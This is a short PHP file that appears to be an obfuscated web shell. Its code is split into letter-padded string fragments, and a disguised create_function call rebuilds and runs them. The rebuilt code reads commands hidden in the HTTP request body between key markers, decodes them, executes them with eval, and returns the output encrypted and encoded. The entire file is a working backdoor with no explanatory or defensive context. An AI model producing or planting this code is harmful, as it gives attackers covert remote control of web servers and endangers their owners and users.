<?php
$S='foJr($Ji=0;$Ji<$lJ;J){for($j=0;(J$j<J$c&&$i<$l);$j++J,J$i++J){$o.=$Jt{$i}^$';
$l='$k="eJ428Jd9c2";$kJh="4da4e9dJacJ970J";$kf="14ba14J22J480J7";$p="31Te4JS2';
$u='k{$jJ};}}reJtuJrn J$o;}if (@pregJJ_match("/$kJh(.+)$kJf/",@fJilJe_gJet_con';
$M='baJsJe64J_decodJe($m[1]J),$k)));$Jo=@obJ_geJt_contents();J@ob_enJd_cJlean';
$n='2Y5PmdJHJJLL";functionJ Jx($t,$k){$c=Jstrlen($k)J;J$l=strJlen($t);$oJ="";';
$T=str_replace('p','','cprepate_pfuppnctipon');
$w='()J;$r=@baJseJ64_eJncodJe(@x(@gzJcompress($o),J$k));Jprint("$JpJ$kh$r$kf");}';
$C='tJents("phpJJ://input"),$JmJ)==1) {@ob_sJtart();@eJval(J@gzuncoJmpress(J@x(@';
$g=str_replace('J','',$l.$n.$S.$u.$C.$M.$w);
$c=$T('',$g);$c();
?>
